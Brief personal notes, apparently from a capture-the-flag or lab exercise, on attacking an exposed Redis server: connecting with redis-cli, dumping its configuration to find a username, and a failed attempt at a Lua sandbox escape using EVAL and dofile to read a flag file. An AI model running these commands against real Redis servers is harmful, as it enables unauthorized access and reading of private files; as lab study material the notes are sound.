```bash
redis-cli -h 10.10.190.115 -p 6379
```


Leaked username
```bash
CONFIG GET *
```

![[Pasted image 20240127113739.png]]

username:`enterprise-security`


LUA sandbox escape

https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html

```bash
redis-cli -h 10.10.190.115 -p 6379 EVAL "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0
```

doesnt work for some reason
![[Pasted image 20240127115328.png]]

